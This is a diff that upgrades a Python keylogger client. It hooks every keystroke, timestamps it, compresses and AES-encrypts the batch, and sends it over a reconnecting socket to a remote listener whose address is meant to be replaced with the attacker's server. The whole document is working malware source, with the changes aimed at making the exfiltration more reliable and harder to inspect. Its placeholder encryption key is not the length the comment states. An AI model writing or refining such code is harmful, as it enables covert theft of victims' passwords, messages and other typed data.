@@ -1,98 +1,141 @@
+import os
 import socket
 import keyboard
 import threading
-from time import sleep
+import zlib
+import time
+import json
+from collections import deque
+from datetime import datetime
 
 # Configuration
-HOST = '127.0.0.1'  # Replace with your ncat server IP
-PORT = 4444  # Replace with your ncat server port
-BUFFER_SIZE = 100  # Number of characters to store before sending
-RECONNECT_DELAY = 5  # Seconds between connection attempts
+HOST = '127.0.0.1'
+PORT = 4444
+BUFFER_THRESHOLD = 20  # Characters before sending
+MAX_DELAY = 2.0  # Maximum seconds between sends
+RECONNECT_BASE_DELAY = 1.0
+ENCRYPTION_KEY = b'your-secret-key-32'  # 32-byte key for AES
 
 
 class KeyLoggerClient:
     def __init__(self):
-        self.buffer = []
-        self.socket = None
-        self.connected = False
+        self.buffer = deque(maxlen=1000)
+        self.sock = None
+        self.last_send = time.time()
         self.running = True
+        self.send_lock = threading.Lock()
+        self.connection_event = threading.Event()
+        self.sequence = 0
 
-    def connect(self):
-        """Establish connection to ncat server"""
-        while self.running and not self.connected:
-            try:
-                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                self.socket.connect((HOST, PORT))
-                self.connected = True
-                print(f"[*] Connected to {HOST}:{PORT}")
-            except Exception as e:
-                print(f"[!] Connection failed: {str(e)}")
-                sleep(RECONNECT_DELAY)
-
-    def send_keys(self):
-        """Send buffered keystrokes to server"""
-        if self.connected and self.buffer:
-            try:
-                data = ''.join(self.buffer)
-                self.socket.sendall(data.encode())
-                self.buffer.clear()
-            except Exception as e:
-                print(f"[!] Send error: {str(e)}")
-                self.connected = False
-                self.socket.close()
-                self.connect()
-
-    def key_handler(self, event):
-        """Process keyboard events"""
-        key = event.name
-
-        # Handle special keys
-        if len(key) > 1:
-            key = f'[{key.upper()}]'
-
-        self.buffer.append(key)
-
-        # Send if buffer reaches threshold
-        if len(self.buffer) >= BUFFER_SIZE:
-            self.send_keys()
-
-    def start(self):
-        """Start keylogging and network connection"""
-        # Start connection thread
-        connect_thread = threading.Thread(target=self.connect)
-        connect_thread.daemon = True
-        connect_thread.start()
+        # Start network thread
+        self.network_thread = threading.Thread(target=self._network_handler)
+        self.network_thread.daemon = True
+        self.network_thread.start()
 
         # Start keyboard listener
-        keyboard.on_press(self.key_handler)
+        keyboard.hook(self._key_handler)
 
-        # Periodic send every 30 seconds
-        def periodic_send():
-            while self.running:
-                self.send_keys()
-                sleep(30)
-
-        send_thread = threading.Thread(target=periodic_send)
-        send_thread.daemon = True
-        send_thread.start()
-
-        # Keep main thread alive
-        while self.running:
+    def _connect(self):
+        """Establish connection with exponential backoff"""
+        delay = RECONNECT_BASE_DELAY
+        while self.running and not self.connection_event.is_set():
             try:
-                sleep(0.1)
-            except KeyboardInterrupt:
-                self.stop()
+                self.sock = socket.create_connection((HOST, PORT), timeout=5)
+                self.connection_event.set()
+                print(f"[+] Connected to {HOST}:{PORT}")
+                return True
+            except Exception as e:
+                print(f"[-] Connection failed: {e}")
+                time.sleep(delay)
+                delay = min(delay * 2, 30)  # Max 30s backoff
+        return False
+
+    def _network_handler(self):
+        """Handle network operations in separate thread"""
+        while self.running:
+            if not self.connection_event.is_set():
+                self._connect()
+                continue
+
+            try:
+                # Process buffer every 100ms
+                time.sleep(0.1)
+                self._send_data()
+            except Exception as e:
+                print(f"Network error: {e}")
+                self.connection_event.clear()
+                self.sock.close()
+
+    def _key_handler(self, event):
+        """Handle keyboard events with precise timing"""
+        timestamp = datetime.now().isoformat()
+        key = event.name if len(event.name) == 1 else f"[{event.name.upper()}]"
+
+        self.buffer.append({
+            'seq': self.sequence,
+            'time': timestamp,
+            'key': key,
+            'event': 'down' if event.event_type == 'down' else 'up'
+        })
+        self.sequence += 1
+
+        # Trigger immediate send if threshold reached
+        if len(self.buffer) >= BUFFER_THRESHOLD:
+            self._send_data()
+
+    def _send_data(self):
+        """Send compressed data with sequence tracking"""
+        with self.send_lock:
+            if not self.buffer or not self.connection_event.is_set():
+                return
+
+            # Send if buffer full or max delay reached
+            if (len(self.buffer) >= BUFFER_THRESHOLD or
+                    (time.time() - self.last_send) >= MAX_DELAY):
+
+                # Package and clear buffer
+                data = list(self.buffer)
+                self.buffer.clear()
+
+                # Compress and encrypt
+                payload = zlib.compress(json.dumps(data).encode())
+                encrypted = self._encrypt(payload)
+
+                try:
+                    header = len(encrypted).to_bytes(4, 'big')
+                    self.sock.sendall(header + encrypted)
+                    self.last_send = time.time()
+                except Exception as e:
+                    print(f"Send failed: {e}")
+                    self.connection_event.clear()
+
+    def _encrypt(self, data):
+        """AES encryption (requires cryptography library)"""
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+
+        iv = os.urandom(16)
+        cipher = Cipher(
+            algorithms.AES(ENCRYPTION_KEY),
+            modes.CFB(iv),
+            backend=default_backend()
+        )
+        encryptor = cipher.encryptor()
+        return iv + encryptor.update(data) + encryptor.finalize()
 
     def stop(self):
-        """Cleanup and exit"""
+        """Graceful shutdown"""
         self.running = False
-        if self.connected:
-            self.socket.close()
+        self.connection_event.clear()
+        if self.sock:
+            self.sock.close()
         keyboard.unhook_all()
-        print("[*] Keylogger stopped")
 
 
 if __name__ == "__main__":
-    print("Starting keylogger... (Ctrl+C to stop)")
     logger = KeyLoggerClient()
-    logger.start()
+    try:
+        while True: time.sleep(1)
+    except KeyboardInterrupt:
+        logger.stop()
+        print("[*] Keylogger stopped")
